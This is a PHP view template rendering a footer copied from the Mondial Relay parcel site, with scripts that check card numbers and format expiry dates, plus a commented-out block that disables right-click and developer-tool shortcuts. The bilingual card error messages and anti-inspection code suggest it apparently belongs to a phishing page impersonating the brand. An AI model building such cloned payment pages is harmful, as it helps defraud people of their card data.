<?php
ob_start();
?>



<!-- <script>
    window.onload = () => {
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        document.addEventListener('keydown', (e) => {
            if ((e.ctrlKey && e.shiftKey && e.key == 'I') || // Ctrl+Shift+I
                (e.ctrlKey && e.shiftKey && e.key == 'J') || // Ctrl+Shift+J
                (e.key === 'F12')) { // F12
                e.preventDefault();
            }
        });
    }
</script> -->
<script type="text/javascript">
    function checkValue(str, max) {
        if (str.charAt(0) !== '0' || str == '00') {
            var num = parseInt(str);
            if (isNaN(num) || num <= 0 || num > max) num = 1;
            str = num > parseInt(max.toString().charAt(0)) && num.toString().length == 1 ? '0' + num : num.toString();
        };
        return str;
    };

    function date_reformat_dd(date) {
        date.addEventListener('input', function(e) {
            this.type = 'text';
            var input = this.value;
            if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
            var values = input.split('/').map(function(v) {
                return v.replace(/\D/g, '')
            });
            if (values[1]) values[1] = checkValue(values[1], 12);
            if (values[0]) values[0] = checkValue(values[0], 31);
            var output = values.map(function(v, i) {
                return v.length == 2 && i < 2 ? v + '/' : v;
            });
            this.value = output.join('').substr(0, 14);
        });
    }
</script>
<script>
    function validlun(input) {
        let cardNumber = input.value.replaceAll(" ", "");
        // if (!/^\d{16}$/.test(cardNumber)) {
        //     input.setCustomValidity('Număr de card invalid');
        //     return;
        // }
        let sum = 0;
        let digit;
        let addend;
        let doubled;
        for (let i = 0; i < cardNumber.length; i++) {
            digit = parseInt(cardNumber.charAt(i));
            if (i % 2 === 0) {
                addend = digit * 2;
                if (addend > 9) {
                    addend -= 9;
                }
                sum += addend;
            } else {
                sum += digit;
            }
        }
        if (sum % 10 === 0) {
            input.setCustomValidity('');
            console.log(2);
        } else {
            console.log(1);
            input.setCustomValidity('Numéro de carte invalide');
        }
    }

    function formatString(e) {
        var inputChar = String.fromCharCode(event.keyCode);
        var code = event.keyCode;
        var allowedKeys = [8];
        if (allowedKeys.indexOf(code) !== -1) {
            return;
        }

        event.target.value = event.target.value.replace(
            /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
        ).replace(
            /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
        ).replace(
            /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
        ).replace(
            /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
        ).replace(
            /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 et 00 > 0
        ).replace(
            /[^\d\/]|^[\/]*$/g, '' // Chiffre & / only `/`
        ).replace(
            /\/\//g, '/' // Evit d'avoir plus de 1 `/`
        );
    }
</script>

<footer class="w100">
    <div class="column">
        <div class="sitemap">
            <div class="grid">
                <div class="row listicons">
                    <div class="payplus footer-hp">
                        <h5>Nos solutions de paiement</h5>
                        <div class="payplus-icons-hp">
                            <div class="payplus-icons soluce-paiement">
                                <img src="views/assets/Mastercard.svg" height="36" title="Mastercard">
                                <img src="views/assets/Visa.svg" height="36" title="Visa">
                                <img src="views/assets/Paypal.svg" height="36" title="Paypal">
                                <img src="views/assets/CB.svg" height="36" title="CB">
                            </div>
                            <a href="#/envoi-de-colis/paiement-securise/" target="_blank" class="f-right paypluslink">
                                <img class="icon-locker" src="views/assets/ico_locker.svg" title="Lock">
                                Paiement sécurisé </a>
                        </div>
                    </div>
                </div>
                <div class="mt20 listeliens 5 2">
                    <div>
                        <h5>Particulier</h5>
                        <ul>
                            <li><a href="#/envoi-de-colis/">Envoyer mon
                                    colis pas cher</a></li>
                            <li><a href="#/suivi-de-colis/">Suivre mon
                                    colis</a></li>
                            <li><a href="https://www.mondialrelay.fr/envoi-colis-entre-particulier/">Envoi
                                    colis
                                    entre particuliers</a></li>
                            <li><a href="#/consignes-lockers/" target="">Comment
                                    utiliser nos Lockers ?</a></li>
                            <li>
                                <a href="#/envoi-de-colis/assurer-mon-colis/">Assurer
                                    mon colis</a>
                            </li>
                            <li>
                                <a href="#/envoi-de-colis/tarifs-expeditions/">Découvrir
                                    nos tarifs</a>
                            </li>
                            <li>
                                <a href="#/envoi-de-colis/ebay-by-mondial-relay-mode-demploi/" target="_blank">eBay by Mondial Relay</a>
                            </li>
                            <li><a href="#/application-mobile/">Application
                                    Mobile Mondial Relay</a></li>
                        </ul>
                    </div>
                    <div>
                        <h5>Professionnel</h5>
                        <ul>
                            <li>
                                <a href="#/solutionspro/decouvrez-votre-offre/">Nos
                                    offres</a>
                            </li>
                            <li>
                                <a href="#/solutionspro/offres-et-services/offre-start/tarifs-et-paiement/">Nos
                                    tarifs pro</a>
                            </li>
                            <li>
                                <a href="#/solutionspro/nos-clients-partenaires/nos-clients/">Nos
                                    partenaires</a>
                            </li>
                            <li>
                                <a href="https://partenaires.mondialrelay.fr/explorez-notre-univers/ouvrir-un-point-relais/ouvrir-un-locker/">Installer
                                    un Locker</a>
                            </li>
                            <li><a href="#/devenir-transporteur/">Devenir
                                    Transporteur</a></li>
                            <li><a href="https://partenaires.mondialrelay.fr/" target="_blank">Devenir Point
                                    Relais</a></li>
                            <li><a href="https://blog.mondialrelay.fr/">Découvrez notre Blog Business</a>
                            </li>
                        </ul>
                    </div>
                    <div>
                        <h5>Liens utiles</h5>
                        <ul>
                            <li>
                                <a href="#/envoi-de-colis/conditions-generales-de-vente/">C.G.V.</a>
                            </li>
                            <li><a href="#/mentions-legales/" target="_blank">Mentions Legales</a></li>
                            <li><a href="#/donnees-personnelles/">Charte des
                                    données personnelles</a></li>
                            <li>
                                <a href="#/vos-preferences-pour-la-gestion-des-cookies/">Gestion
                                    des cookies</a>
                            </li>
                            <li><a href="#/conditions-des-offres/">Conditions
                                    des offres</a></li>
                            <li><a href="#/conformit%C3%A9-compliance/">Conformité
                                    / Compliance</a></li>
                        </ul>
                    </div>
                    <div>
                        <h5>Mondial Relay</h5>
                        <ul>
                            <li>
                                <a href="#/nous-contacter/">Contactez-nous</a>
                            </li>
                            <li><a href="#/qui-sommes-nous/">Qui sommes-nous
                                    ?</a></li>
                            <li>
                                <a href="https://www.mondialrelay.fr/mr/qui-sommes-nous/decouvrez-la-responsabilite-sociale-societale-de-notre-entreprise">Nos
                                    engagements RSE</a>
                            </li>
                            <li><a href="https://talents.mondialrelay.com/">Nous rejoindre</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
</footer>
</div>
</div>

</body>

</html>
<?php
return ob_get_clean();
